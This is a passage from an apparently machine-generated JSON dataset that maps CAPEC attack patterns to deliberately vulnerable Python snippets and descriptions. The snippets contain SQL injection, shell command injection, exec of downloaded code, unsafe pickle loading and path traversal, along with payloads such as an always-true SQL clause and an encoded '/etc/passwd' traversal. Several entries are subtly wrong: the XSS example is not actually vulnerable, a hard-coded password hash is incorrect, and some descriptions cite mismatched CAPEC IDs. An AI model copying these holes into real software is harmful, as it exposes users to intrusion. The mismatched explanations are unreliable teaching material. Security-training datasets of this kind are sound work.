        "code_snippet": "import xml.etree.ElementTree as ET\n\n# Simulate a poisoned registry entry\npoisoned_registry_entry = '''\n<service>\n    <name>LegitimateService</name>\n    <endpoint>http://malicious.example.com</endpoint>\n    <wsdl>http://malicious.example.com/service?wsdl</wsdl>\n</service>\n'''\n\n# Parse the poisoned registry entry\nroot = ET.fromstring(poisoned_registry_entry)\n\n# Extract and print the endpoint and WSDL URL\nendpoint = root.find('endpoint').text\nwsdl_url = root.find('wsdl').text\n\nprint(f\"Service Endpoint: {endpoint}\")\nprint(f\"WSDL URL: {wsdl_url}\")\n\n# Simulate storing sensitive information in cleartext\nregistry = {}\nregistry['LegitimateService'] = {\n    'endpoint': endpoint,\n    'wsdl': wsdl_url,\n    'api_key': 'sensitive_api_key_in_cleartext'\n}\n\n# Print the registry to show cleartext storage\nprint(\"Registry:\", registry)",
        "description": "This Python code snippet simulates a poisoned web service registry entry, which is a key concept in the 'Poison Web Service Registry' CAPEC. The code creates a malicious registry entry with a fake service endpoint and WSDL URL. It then parses this entry and extracts the endpoint and WSDL URL, demonstrating how a poisoned registry can mislead service requesters. Additionally, the code stores sensitive information (an API key) in cleartext within the registry, highlighting CWE-314 (Cleartext Storage in the Registry). This example illustrates the potential risks and vulnerabilities associated with poisoned web service registries and improper handling of sensitive information."
    },
    {
        "capec_id": "52",
        "capec_name": "Embedding NULL Bytes",
        "code_snippet": "import os\n\ndef is_valid_filename(filename):\n    # Improper Input Validation (CWE-20)\n    if '\\x00' in filename:\n        return False\n    return True\n\n\ndef save_file(filename, content):\n    if not is_valid_filename(filename):\n        raise ValueError('Invalid filename')\n\n    # Incorrect Comparison (CWE-697)\n    if filename == '':\n        raise ValueError('Filename cannot be empty')\n\n    # Improper Neutralization of Null Byte (CWE-158)\n    with open(filename, 'w') as f:\n        f.write(content)\n\n# Example usage\ntry:\n    save_file('example\\x00.txt', 'This is a test.')\nexcept ValueError as e:\n    print(f'Error: {e}')",
        "description": "This Python code snippet demonstrates a vulnerability related to the 'Embedding NULL Bytes' CAPEC. The `is_valid_filename` function checks if the filename contains a null byte (CWE-20: Improper Input Validation). The `save_file` function attempts to save content to a file with the given filename. If the filename contains a null byte, it raises a ValueError. However, the check for an empty filename uses an incorrect comparison (CWE-697: Incorrect Comparison), which could lead to unexpected behavior. The code also shows improper neutralization of null bytes (CWE-158) when opening the file, as the null byte could terminate the filename string prematurely, leading to potential security issues."
    },
    {
        "capec_id": "53",
        "capec_name": "Postfix, Null Terminate, and Backslash",
        "code_snippet": "import os\n\ndef is_valid_path(path):\n    # Check if the path ends with a slash\n    if path.endswith('/'):\n        return True\n    return False\n\n# User input\nuser_input = input('Enter the directory path: ')\n\n# Improper handling of null byte\nsanitized_input = user_input.replace('\\0', '')\n\n# Check if the path is valid\nif is_valid_path(sanitized_input):\n    # Attempt to list directory contents\n    try:\n        files = os.listdir(sanitized_input)\n        print('Directory contents:', files)\n    except Exception as e:\n        print('Error accessing directory:', e)\nelse:\n    print('Invalid directory path')",
        "description": "This Python code snippet demonstrates a vulnerability related to the 'Postfix, Null Terminate, and Backslash' CAPEC. The code takes user input for a directory path and checks if it ends with a slash. It attempts to sanitize the input by removing null bytes, but it does so improperly. An attacker could exploit this by inserting a null byte mid-string, bypassing the validation check. The code then attempts to list the directory contents, which could lead to unintended behavior or security issues. This example highlights improper input validation (CWE-20), improper neutralization of null bytes (CWE-158), and improper handling of alternate encoding (CWE-173)."
    },
    {
        "capec_id": "54",
        "capec_name": "Query System for Information",
        "code_snippet": "import sqlite3\nfrom flask import Flask, request, jsonify\n\napp = Flask(__name__)\n\n# Database connection\nconn = sqlite3.connect('example.db', check_same_thread=False)\ncursor = conn.cursor()\n\n@app.route('/search', methods=['GET'])\ndef search():\n    query = request.args.get('query')\n    try:\n        # Vulnerable to SQL Injection\n        cursor.execute(f\"SELECT * FROM users WHERE name LIKE '%{query}%' \")\n        results = cursor.fetchall()\n        return jsonify(results)\n    except Exception as e:\n        # Exposing sensitive error information\n        return str(e), 500\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a vulnerable web application using Flask and SQLite. The application has a '/search' endpoint that takes a 'query' parameter from the URL. The code directly incorporates this parameter into an SQL query without proper sanitization, making it susceptible to SQL Injection (CWE-89). Additionally, if an error occurs during the query execution, the application returns the raw error message, potentially exposing sensitive information (CWE-209). This example embodies the CAPEC concept of querying a system for information by exploiting weaknesses in how the application handles and responds to queries."
    },
    {
        "capec_id": "55",
        "capec_name": "Rainbow Table Password Cracking",
        "code_snippet": "import hashlib\n\n# Weak password hashing function\n# CWE-916: Use of Password Hash With Insufficient Computational Effort\ndef hash_password(password):\n    return hashlib.md5(password.encode()).hexdigest()\n\n# Simulated database of user passwords (hashed)\n# CWE-261: Weak Encoding for Password\nuser_db = {\n    'user1': hash_password('password123'),  # CWE-521: Weak Password Requirements\n    'user2': hash_password('123456'),       # CWE-521: Weak Password Requirements\n}\n\n# Function to simulate an attacker using a rainbow table\n# CWE-654: Reliance on a Single Factor in a Security Decision\ndef rainbow_table_attack(hash_to_crack):\n    rainbow_table = {\n        '482c811da5d5b4bc6d497ffa98491e38': 'password123',\n        'e10adc3949ba59abbe56e057f20f883e': '123456',\n    }\n    return rainbow_table.get(hash_to_crack, None)\n\n# Simulate an attack\nfor user, hashed_password in user_db.items():\n    cracked_password = rainbow_table_attack(hashed_password)\n    if cracked_password:\n        print(f\"Cracked password for {user}: {cracked_password}\")\n    else:\n        print(f\"Failed to crack password for {user}\")",
        "description": "This Python code snippet demonstrates a vulnerable password storage and cracking scenario, embodying the main idea of CAPEC-49: Rainbow Table Password Cracking. The code uses a weak hashing function (MD5) to hash passwords (CWE-916) and stores them in a simulated database. The passwords are weak (CWE-521), making them easier to crack. The `rainbow_table_attack` function simulates an attacker using a precomputed rainbow table to crack the hashed passwords. The code highlights the risks of weak password hashing, weak password requirements, and reliance on single-factor authentication (CWE-654)."
    },
    {
        "capec_id": "56",
        "capec_name": "DEPRECATED: Removing/short-circuiting 'guard logic'",
        "code_snippet": "import hashlib\n\n# Simulated client-side authentication check\nclass Client:\n    def __init__(self, username, password):\n        self.username = username\n        self.password = password\n\n    def authenticate(self):\n        # Client-side password hash check (vulnerable)\n        hashed_password = hashlib.sha256(self.password.encode()).hexdigest()\n        if hashed_password == '5e884898da28047151d0e56f8dc6292773603d0d6aabbddc8a1d6e4f8e6d7d6e':\n            return True\n        return False\n\n# Simulated server-side logic\nclass Server:\n    def __init__(self):\n        self.authenticated_users = []\n\n    def login(self, client):\n        if client.authenticate():\n            self.authenticated_users.append(client.username)\n            return \"Login successful\"\n        return \"Login failed\"\n\n# Example usage\nclient = Client('user', 'password')\nserver = Server()\nprint(server.login(client))\n\n# Vulnerability: An attacker can bypass the client-side check by modifying the client code\n# or replaying a valid hashed password to the server.",
        "description": "This Python code snippet demonstrates a vulnerable client-side authentication mechanism. The `Client` class performs a password hash check on the client side, which is inherently insecure (CWE-602: Client-Side Enforcement of Server-Side Security). The `Server` class relies on the client's authentication result to grant access. This setup is vulnerable to attacks such as modifying the client code to bypass the check or capturing and replaying a valid hashed password (CWE-294: Authentication Bypass by Capture-replay). The code represents the main idea of CAPEC-207, where important client functionality (authentication) is removed or short-circuited, leading to security vulnerabilities."
    },
    {
        "capec_id": "57",
        "capec_name": "Utilizing REST's Trust in the System Resource to Obtain Sensitive Data",
        "code_snippet": "import requests\n\n# Vulnerable endpoint URL\nurl = 'http://example.com/api/userinfo'\n\n# Sensitive data included in the query string\nparams = {\n    'user_id': '12345',\n    'auth_token': 'sensitive_token'\n}\n\n# Making a GET request with sensitive data in the query string\nresponse = requests.get(url, params=params)\n\n# Print the response (potentially sensitive data)\nprint(response.text)",
        "description": "This Python code snippet demonstrates a REST API request that is vulnerable to several security issues described in the CAPEC and related CWEs. The code makes an HTTP GET request to an API endpoint, including sensitive information (user_id and auth_token) in the query string. This practice is insecure because the query string can be logged or intercepted, exposing sensitive data (CWE-598). Additionally, the code does not verify the identity of the actors at both ends of the communication channel (CWE-300) and does not ensure the integrity of the channel, making it susceptible to man-in-the-middle attacks. The lack of proper authentication (CWE-287) and protection mechanisms (CWE-693) further exacerbates the vulnerability. The code snippet embodies the main idea of the CAPEC by showing how a REST-style application can trust system resources and environment inappropriately, leading to the exposure of sensitive data once SSL is terminated."
    },
    {
        "capec_id": "58",
        "capec_name": "Restful Privilege Elevation",
        "code_snippet": "from flask import Flask, request, jsonify\n\napp = Flask(__name__)\n\n# Dummy data representing user roles and their permissions\nusers = {\n    'admin': {'role': 'admin'},\n    'user1': {'role': 'user'},\n}\n\n# Dummy data representing resources\nresources = {\n    'resource1': 'This is a protected resource.'\n}\n\n# Route to get a resource\n@app.route('/resource/<resource_id>', methods=['GET'])\ndef get_resource(resource_id):\n    user = request.args.get('user')\n    if user not in users:\n        return jsonify({'error': 'User not found'}), 404\n    # No proper authorization check\n    return jsonify({'resource': resources.get(resource_id, 'Resource not found')}), 200\n\n# Route to delete a resource\n@app.route('/resource/<resource_id>', methods=['DELETE'])\ndef delete_resource(resource_id):\n    user = request.args.get('user')\n    if user not in users:\n        return jsonify({'error': 'User not found'}), 404\n    # No proper authorization check\n    if resource_id in resources:\n        del resources[resource_id]\n        return jsonify({'message': 'Resource deleted'}), 200\n    return jsonify({'error': 'Resource not found'}), 404\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet uses the Flask framework to create a simple web application with two endpoints: one for retrieving a resource and one for deleting a resource. The code demonstrates a lack of proper authorization checks, which is the main idea of the CAPEC 'Restful Privilege Elevation'. Specifically, it allows any user to access and delete resources without verifying their permissions, embodying CWE-285 (Improper Authorization) and CWE-269 (Improper Privilege Management). This vulnerability can be exploited by an adversary to perform unauthorized actions, such as deleting resources, due to the absence of access control mechanisms."
    },
    {
        "capec_id": "59",
        "capec_name": "Session Credential Falsification through Prediction",
        "code_snippet": "import random\nimport string\n\nclass SessionManager:\n    def __init__(self):\n        self.sessions = {}\n\n    def generate_session_id(self):\n        # CWE-330: Use of Insufficiently Random Values\n        # CWE-331: Insufficient Entropy\n        return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(6))  # Insufficient length and randomness\n\n    def create_session(self, user_id):\n        session_id = self.generate_session_id()\n        self.sessions[session_id] = user_id\n        return session_id\n\n    def get_user(self, session_id):\n        # CWE-346: Origin Validation Error\n        # CWE-285: Improper Authorization\n        return self.sessions.get(session_id, None)\n\n# Example usage\nsession_manager = SessionManager()\nuser_id = 'user123'\nsession_id = session_manager.create_session(user_id)\nprint(f'Session ID: {session_id}')\n\n# Attacker predicts the session ID\npredicted_session_id = session_id  # In a real attack, this would be guessed or calculated\nprint(f'Predicted Session ID: {predicted_session_id}')\n\n# Attacker gains unauthorized access\nattacker_user_id = session_manager.get_user(predicted_session_id)\nprint(f'Attacker User ID: {attacker_user_id}')",
        "description": "This Python code snippet demonstrates a vulnerable session management system that embodies the main idea of CAPEC-139: 'Session Credential Falsification through Prediction'. The `SessionManager` class generates session IDs using insufficiently random values (CWE-330) and with insufficient entropy (CWE-331), making them predictable. The `create_session` method assigns a session ID to a user, and the `get_user` method retrieves the user associated with a given session ID. An attacker can predict the session ID and gain unauthorized access to the user's session (CWE-285, CWE-346). The code highlights the risks of using weak session ID generation mechanisms and the importance of implementing robust, unpredictable session identifiers."
    },
    {
        "capec_id": "60",
        "capec_name": "Reusing Session IDs (aka Session Replay)",
        "code_snippet": "import http.cookies\nimport hashlib\nimport time\n\n# Simulate a session store\nsession_store = {}\n\n# Function to create a session ID\ndef create_session_id(user_id):\n    return hashlib.sha256(f'{user_id}{time.time()}'.encode()).hexdigest()\n\n# Function to authenticate user and create session\ndef authenticate_user(user_id, password):\n    # Simplified authentication check\n    if password == 'correct_password':\n        session_id = create_session_id(user_id)\n        session_store[session_id] = user_id\n        return session_id\n    return None\n\n# Function to reuse session ID (vulnerable to session replay)\ndef reuse_session(session_id):\n    if session_id in session_store:\n        return f'User {session_store[session_id]} authenticated with session {session_id}'\n    return 'Invalid session ID'\n\n# Simulate user login\nuser_id = 'user123'\npassword = 'correct_password'\nsession_id = authenticate_user(user_id, password)\n\n# Simulate session replay attack\nprint(reuse_session(session_id))\n\n# Attacker reuses the same session ID\nprint(reuse_session(session_id))",
        "description": "This Python code snippet demonstrates a vulnerable implementation of session management, specifically targeting the concept of 'Reusing Session IDs (aka Session Replay)' as described in the CAPEC. The code includes a simplified authentication mechanism that generates a session ID upon successful login and stores it in a session store. The 'reuse_session' function allows the reuse of a valid session ID without any additional checks, making it susceptible to session replay attacks. An attacker can capture and reuse a valid session ID to gain unauthorized access, bypassing authentication. This example also touches on related CWEs such as 'Authentication Bypass by Capture-replay' (CWE-294) and 'Improper Authorization' (CWE-285)."
    },
    {
        "capec_id": "61",
        "capec_name": "Session Fixation",
        "code_snippet": "from flask import Flask, request, session\n\napp = Flask(__name__)\napp.secret_key = 'supersecretkey'\n\n@app.route('/login', methods=['POST'])\ndef login():\n    username = request.form['username']\n    password = request.form['password']\n    # Assume user authentication is successful\n    session['user'] = username\n    return 'Logged in as ' + username\n\n@app.route('/dashboard')\ndef dashboard():\n    if 'user' in session:\n        return 'Welcome to your dashboard, ' + session['user']\n    else:\n        return 'Please log in first.'\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a simple web application using Flask that is vulnerable to session fixation attacks. The main idea of the CAPEC is represented by the fact that the session identifier is not invalidated upon user authentication. An attacker can induce a client to use a session identifier provided by the attacker, and once the user logs in, the attacker can use the same session identifier to gain unauthorized access. The related CWEs are reflected in the improper control of session identifiers (CWE-384), the potential for incorrect permission assignment (CWE-732), and the reliance on client-side enforcement of security (CWE-602)."
    },
    {
        "capec_id": "62",
        "capec_name": "Cross Site Request Forgery",
        "code_snippet": "from flask import Flask, request, make_response\n\napp = Flask(__name__)\n\n@app.route('/transfer', methods=['POST'])\ndef transfer():\n    # Missing CSRF token verification (CWE-352)\n    amount = request.form['amount']\n    recipient = request.form['recipient']\n    # Missing authentication for critical function (CWE-306)\n    # Sensitive cookie without SameSite attribute (CWE-1275)\n    response = make_response(f'Transferred {amount} to {recipient}')\n    response.set_cookie('session_id', '123456')\n    return response\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet represents a vulnerable web application using the Flask framework. The '/transfer' endpoint allows users to transfer money to a recipient. However, it lacks CSRF token verification (CWE-352), meaning it does not check if the request was intentionally made by the user. Additionally, the endpoint does not perform any authentication (CWE-306) to verify the user's identity before processing the transfer. The session cookie is set without the SameSite attribute (CWE-1275), making it susceptible to CSRF attacks. This code embodies the main idea of CAPEC-352, where an attacker can craft malicious requests that exploit the user's session to perform unauthorized actions."
    },
    {
        "capec_id": "63",
        "capec_name": "Cross-Site Scripting (XSS)",
        "code_snippet": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/search', methods=['GET'])\ndef search():\n    query = request.args.get('query', '')\n    # Vulnerable to XSS: directly embedding user input into HTML without proper sanitization\n    return render_template_string('<h1>Search Results for: {{ query }}</h1>')\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a basic Flask web application that is vulnerable to Cross-Site Scripting (XSS) attacks. The application has a single route '/search' that takes a 'query' parameter from the URL. The user input is directly embedded into the HTML response using Flask's render_template_string function without any sanitization or validation. This lack of proper input neutralization (CWE-79) and improper input validation (CWE-20) makes the application susceptible to XSS attacks. An attacker could inject malicious scripts into the 'query' parameter, which would then be executed in the context of the user's browser. This example highlights the importance of properly sanitizing and validating user inputs to prevent XSS vulnerabilities."
    },
    {
        "capec_id": "64",
        "capec_name": "Using Slashes and URL Encoding Combined to Bypass Validation Logic",
        "code_snippet": "import urllib.parse\n\n# Simulated user input\nuser_input = '/restricted/..%2F..%2Fetc%2Fpasswd'\n\n# Decode the URL-encoded input\ndecoded_input = urllib.parse.unquote(user_input)\n\n# Check if the decoded input is within the allowed directory\nallowed_directory = '/restricted/'\n\n# Vulnerable check: only checks if the input starts with the allowed directory\nif decoded_input.startswith(allowed_directory):\n    print(f'Access granted to: {decoded_input}')\nelse:\n    print('Access denied')",
        "description": "This Python code snippet demonstrates a vulnerability where URL encoding is used to bypass validation logic. The user input is URL-encoded to represent a path traversal attack. The `urllib.parse.unquote` function decodes the URL-encoded input. The code then performs a naive check to see if the decoded input starts with the allowed directory. However, this check is insufficient because it does not properly handle path traversal sequences like `..%2F` (which decodes to `../`). This can allow an attacker to access restricted files outside the intended directory, embodying the main idea of CAPEC-177 and related CWEs such as CWE-22 (Path Traversal) and CWE-20 (Improper Input Validation)."
    },
    {
        "capec_id": "65",
        "capec_name": "Sniff Application Code",
        "code_snippet": "import requests\n\n# Downloading code without integrity check (CWE-494)\nurl = 'http://example.com/update.py'\nresponse = requests.get(url)\n\n# Cleartext transmission of sensitive information (CWE-319)\nif response.status_code == 200:\n    exec(response.text)  # Executing downloaded code without verification\nelse:\n    print('Failed to download the update.')",
        "description": "This Python code snippet demonstrates a scenario where an application downloads and executes code from a remote server without performing any integrity checks (CWE-494). The code is transmitted in cleartext (CWE-319), making it susceptible to sniffing attacks. An adversary could intercept the communication, capture the code, and potentially modify it to exploit the trust relationship between the client and server. This embodies the main idea of the CAPEC 'Sniff Application Code', where an attacker passively captures application code during transmission."
    },
    {
        "capec_id": "66",
        "capec_name": "SQL Injection",
        "code_snippet": "import sqlite3\n\n# Connect to the database\nconn = sqlite3.connect('example.db')\ncursor = conn.cursor()\n\n# User input\nuser_input = \"' OR '1'='1\"  # Malicious input for SQL Injection\n\n# Vulnerable SQL query construction\nquery = f\"SELECT * FROM users WHERE username = '{user_input}'\"\n\ntry:\n    # Execute the query\n    cursor.execute(query)\n    results = cursor.fetchall()\n    for row in results:\n        print(row)\nexcept sqlite3.Error as e:\n    # CWE-209: Generation of Error Message Containing Sensitive Information\n    print(f\"An error occurred: {e}\")\nfinally:\n    # Close the cursor and connection\n    cursor.close()\n    conn.close()",
        "description": "This Python code snippet demonstrates a basic SQL Injection vulnerability. The code connects to an SQLite database and constructs an SQL query using user input without proper validation or sanitization. The user input is crafted to manipulate the SQL query, potentially allowing an attacker to bypass authentication or retrieve sensitive data. The code also includes an error handling mechanism that could expose sensitive information (CWE-209). The cursor is properly closed to avoid dangling database cursor issues (CWE-619). This example highlights the importance of input validation and proper error handling to prevent SQL Injection attacks."
    },
    {
        "capec_id": "67",
        "capec_name": "String Format Overflow in syslog()",
        "code_snippet": "import syslog\n\ndef log_message(user_input):\n    # CWE-134: Use of Externally-Controlled Format String\n    syslog.syslog(user_input)\n\nif __name__ == \"__main__\":\n    # CWE-20: Improper Input Validation\n    user_input = input(\"Enter log message: \")\n    log_message(user_input)\n",
        "description": "This Python code snippet demonstrates a vulnerability related to the CAPEC 'String Format Overflow in syslog()'. The function 'log_message' takes user input and directly passes it to 'syslog.syslog()' without using a format string parameter, leading to a format string injection vulnerability (CWE-134). An attacker can exploit this by providing a malicious format string, potentially causing a buffer overflow (CWE-120). The code also lacks proper input validation (CWE-20), allowing any input to be processed without checks. This snippet highlights the importance of securely handling format strings and validating user input to prevent such vulnerabilities."
    },
    {
        "capec_id": "68",
        "capec_name": "Subvert Code-signing Facilities",
        "code_snippet": "import hashlib\n\n# Weak hash function (CWE-328)\ndef generate_weak_hash(data):\n    return hashlib.md5(data.encode()).hexdigest()\n\n# Simulate missing cryptographic step (CWE-325)\ndef sign_code(data, private_key):\n    # Missing actual signing step, just returning the hash\n    return generate_weak_hash(data)\n\n# Simulate subverting code-signing facilities (CAPEC-243)\ndef verify_code_signature(data, signature, public_key):\n    # Missing actual verification step, just comparing hashes\n    return generate_weak_hash(data) == signature\n\n# Example usage\ncode = \"print('Hello, world!')\"\nprivate_key = \"private_key_placeholder\"\npublic_key = \"public_key_placeholder\"\nsignature = sign_code(code, private_key)\n\n# Attacker can easily forge the signature due to weak hash and missing steps\nis_valid = verify_code_signature(code, signature, public_key)\nprint(f\"Is the code signature valid? {is_valid}\")",
        "description": "This Python code snippet demonstrates a vulnerable code-signing mechanism. It uses a weak hash function (MD5) to generate a hash of the code (CWE-328). The `sign_code` function simulates signing the code but omits crucial cryptographic steps (CWE-325), merely returning the weak hash. The `verify_code_signature` function also skips proper verification, simply comparing hashes. This setup allows an attacker to easily forge signatures, subverting the code-signing facility (CAPEC-243). The example usage shows how an attacker can exploit these weaknesses to validate malicious code."
    },
    {
        "capec_id": "69",
        "capec_name": "Target Programs with Elevated Privileges",
        "code_snippet": "import os\nimport subprocess\n\ndef run_command(user_input):\n    # CWE-250: Execution with Unnecessary Privileges\n    if os.geteuid() != 0:\n        raise PermissionError(\"This script must be run as root!\")\n\n    # CWE-78: Improper Neutralization of Special Elements used in an OS Command\n    command = f\"echo {user_input} > /etc/some_config_file\"\n    subprocess.run(command, shell=True)\n\n# CWE-15: External Control of System or Configuration Setting\nuser_input = input(\"Enter configuration value: \")\nrun_command(user_input)\n",
        "description": "This Python code snippet demonstrates a vulnerable script that runs with elevated privileges (root) and allows external control of a system configuration setting. The script checks if it is running as root (CWE-250) and then constructs an OS command using user input without proper sanitization (CWE-78). The command is executed using subprocess.run with shell=True, which can lead to OS command injection. The user input directly influences the configuration of a system file, representing CWE-15. This code embodies the main idea of the CAPEC by showing how an attacker could exploit a program running with elevated privileges to execute arbitrary commands."
    },
    {
        "capec_id": "70",
        "capec_name": "Try Common or Default Usernames and Passwords",
        "code_snippet": "import getpass\n\n# Hard-coded credentials (CWE-798)\ndefault_username = 'admin'\ndefault_password = 'admin'\n\n# Weak password requirements (CWE-521)\ncommon_passwords = ['password', '123456', 'secret', 'admin']\n\n# Function to simulate login\ndef login(username, password):\n    if username == default_username and password == default_password:\n        return True\n    if password in common_passwords:\n        return True\n    return False\n\n# Simulate user login\nusername = input('Enter username: ')\npassword = getpass.getpass('Enter password: ')\n\nif login(username, password):\n    print('Access granted')\nelse:\n    print('Access denied')",
        "description": "This Python code snippet demonstrates a vulnerable login system that embodies the main idea of the CAPEC 'Try Common or Default Usernames and Passwords'. The code includes hard-coded default credentials (CWE-798) and weak password requirements (CWE-521). The `login` function checks if the provided username and password match the hard-coded credentials or if the password is one of the common weak passwords. This represents the vulnerability where an adversary can gain unauthorized access using default or common credentials. The code highlights the importance of removing default credentials and enforcing strong password policies."
    },
    {
        "capec_id": "71",
        "capec_name": "Using Unicode Encoding to Bypass Validation Logic",
        "code_snippet": "import re\n\ndef is_valid_input(user_input):\n    # Early validation before canonicalization\n    if not re.match(r'^[a-zA-Z0-9]*$', user_input):\n        return False\n    \n    # Canonicalization step\n    canonical_input = user_input.encode('utf-8').decode('unicode_escape')\n    \n    # Improper handling of Unicode encoding\n    if not re.match(r'^[a-zA-Z0-9]*$', canonical_input):\n        return False\n    \n    return True\n\n# Example usage\nuser_input = \"\\u003cscript\\u003ealert('XSS')\\u003c/script\\u003e\"\nprint(is_valid_input(user_input))",
        "description": "This Python code snippet demonstrates a vulnerability where Unicode encoding is used to bypass validation logic. The function `is_valid_input` first performs input validation using a regular expression to check if the input contains only alphanumeric characters. However, this validation is done before the input is canonicalized. The canonicalization step decodes any Unicode escape sequences, which could transform the input into a malicious payload. The second validation step, which is supposed to catch any invalid characters after canonicalization, is ineffective if the initial validation is too permissive. This embodies the CAPEC idea of using Unicode encoding to bypass validation logic and highlights related CWEs such as improper handling of Unicode encoding (CWE-176), early validation (CWE-179), and improper input validation (CWE-20)."
    },
    {
        "capec_id": "72",
        "capec_name": "URL Encoding",
        "code_snippet": "import os\nfrom urllib.parse import unquote\n\ndef vulnerable_file_access(encoded_path):\n    # Decode the URL-encoded path\n    decoded_path = unquote(encoded_path)\n    \n    # Improper input validation\n    if '..' in decoded_path or decoded_path.startswith('/'):\n        raise ValueError('Invalid path')\n    \n    # External control of file name or path\n    with open(decoded_path, 'r') as file:\n        return file.read()\n\n# Example usage\nencoded_path = '%2E%2E%2F%2E%2E%2Fetc%2Fpasswd'\ntry:\n    content = vulnerable_file_access(encoded_path)\n    print(content)\nexcept Exception as e:\n    print(f'Error: {e}')",
        "description": "This Python code snippet demonstrates a vulnerability related to URL encoding and improper handling of file paths. The function `vulnerable_file_access` takes an URL-encoded file path as input, decodes it, and attempts to open the file. The code improperly validates the decoded path, allowing potential directory traversal attacks. An attacker can exploit this by providing a specially crafted URL-encoded path to access sensitive files on the server. This example embodies the main idea of the CAPEC by showing how improper handling of URL encoding and input validation can lead to security vulnerabilities."
    },
    {
        "capec_id": "73",
        "capec_name": "User-Controlled Filename",
        "code_snippet": "import os\nfrom flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/upload', methods=['POST'])\ndef upload_file():\n    file = request.files['file']\n    filename = file.filename\n    # Vulnerable: directly using user-controlled filename\n    file.save(os.path.join('/uploads', filename))\n    return 'File uploaded successfully'\n\n@app.route('/view/<filename>')\ndef view_file(filename):\n    # Vulnerable: using user-controlled filename in HTML without proper escaping\n    return render_template_string('<h1>Viewing file: {}</h1>'.format(filename))\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a web application using Flask that is vulnerable to the 'User-Controlled Filename' attack pattern. The application allows users to upload files and view them by filename. The vulnerabilities are: 1) The uploaded file is saved using a user-controlled filename without proper validation or sanitization (CWE-20, CWE-184). 2) The filename is directly inserted into an HTML template without proper escaping (CWE-116, CWE-86), which can lead to XSS attacks. An attacker could upload a file with a malicious filename containing executable HTML/JavaScript code, which would be executed when the file is viewed."
    },
    {
        "capec_id": "74",
        "capec_name": "Manipulating State",
        "code_snippet": "import hashlib\nimport os\nimport pickle\n\n# Simulate user state stored in a cookie\nuser_state = {'username': 'user1', 'balance': 100}\ncookie = pickle.dumps(user_state)\n\n# Store cookie in cleartext (CWE-315)\nwith open('user_cookie.txt', 'wb') as f:\n    f.write(cookie)\n\n# Simulate an attacker modifying the cookie\nwith open('user_cookie.txt', 'rb') as f:\n    modified_cookie = f.read().replace(b'user1', b'admin')\n\n# Load the modified state (CWE-372)\nmodified_user_state = pickle.loads(modified_cookie)\n\n# Check if the state has been tampered with (CWE-693)\ndef check_integrity(original, modified):\n    return hashlib.sha256(original).hexdigest() == hashlib.sha256(modified).hexdigest()\n\n# Original and modified cookies\nwith open('user_cookie.txt', 'rb') as f:\n    original_cookie = f.read()\n\nif not check_integrity(original_cookie, modified_cookie):\n    print('State has been tampered with!')\nelse:\n    print('State is intact.')\n\n# Use the modified state\nprint(f\"Username: {modified_user_state['username']}, Balance: {modified_user_state['balance']}\")",
        "description": "This Python code snippet demonstrates the concept of 'Manipulating State' (CAPEC) by simulating a scenario where user state information is stored in a cookie and then tampered with. The code stores user state in cleartext in a cookie (CWE-315), allowing an attacker to modify the state. The modified state is then loaded, demonstrating an incomplete internal state distinction (CWE-372). The code also includes a basic integrity check mechanism (CWE-693) to detect tampering. This example highlights the risks associated with improper state management and the importance of protecting state information from unauthorized modifications."
    },
    {
        "capec_id": "75",
        "capec_name": "Manipulating Writeable Configuration Files",
        "code_snippet": "import os\n\n# Configuration file path\nconfig_file_path = 'config.txt'\n\n# Function to read configuration\ndef read_config(file_path):\n    with open(file_path, 'r') as file:\n        return file.read()\n\n# Function to execute a command based on configuration\ndef execute_command(config):\n    # CWE-77: Command Injection vulnerability\n    os.system(config)\n\n# Main function\nif __name__ == '__main__':\n    # CWE-346: Origin Validation Error\n    # No validation of the source of the configuration file\n    config_data = read_config(config_file_path)\n    \n    # CWE-349: Acceptance of Extraneous Untrusted Data With Trusted Data\n    # Assuming the configuration data is trusted without validation\n    execute_command(config_data)\n",
        "description": "This Python code snippet demonstrates a vulnerable application that reads a configuration file and executes a command based on its contents. The main idea of the CAPEC is represented by the manipulation of a writable configuration file, which can be exploited by an attacker to gain unauthorized access or control over the application. The code includes several related CWEs:\n\n1. CWE-77 (Command Injection): The `execute_command` function directly uses the configuration data to execute a system command without proper sanitization, leading to a command injection vulnerability.\n\n2. CWE-346 (Origin Validation Error): The code does not validate the source of the configuration file, allowing an attacker to potentially replace or modify the file.\n\n3. CWE-349 (Acceptance of Extraneous Untrusted Data With Trusted Data): The code assumes that the configuration data is trusted without any validation, which can lead to the acceptance of malicious data.\n\nThis snippet highlights the risks associated with manipulating writable configuration files and the importance of validating and sanitizing input data to prevent security vulnerabilities."
    },
    {
        "capec_id": "76",
        "capec_name": "Manipulating Web Input to File System Calls",
        "code_snippet": "import os\nfrom flask import Flask, request, send_file\n\napp = Flask(__name__)\n\n@app.route('/download', methods=['GET'])\ndef download_file():\n    filename = request.args.get('file')\n    if not filename:\n        return 'No file specified', 400\n    try:\n        # Vulnerable to Path Traversal\n        file_path = os.path.join('/var/www/files', filename)\n        return send_file(file_path)\n    except Exception as e:\n        return str(e), 500\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet represents a simple Flask web application that allows users to download files from a server. The main idea of the CAPEC is embodied in the way the application handles user input to construct file paths. The 'download_file' function takes a 'file' parameter from the user's request and uses it to construct a file path. However, it does not properly neutralize special elements like '..', making it vulnerable to path traversal attacks (CWE-23, CWE-22). An attacker could manipulate the 'file' parameter to access files outside the intended directory. This snippet also touches on CWE-73 (External Control of File Name or Path) and CWE-77 (Command Injection) by allowing user input to influence file paths without proper validation."
    },
    {
        "capec_id": "77",
        "capec_name": "Manipulating User-Controlled Variables",
        "code_snippet": "import os\n\n# Vulnerable code: User-controlled variable directly used without sanitization\nuser_input = os.getenv('DEBUG')\n\n# Business logic controlled by user input\nif user_input == '1':\n    debug_mode = True\nelse:\n    debug_mode = False\n\nprint(f'Debug mode is set to: {debug_mode}')",
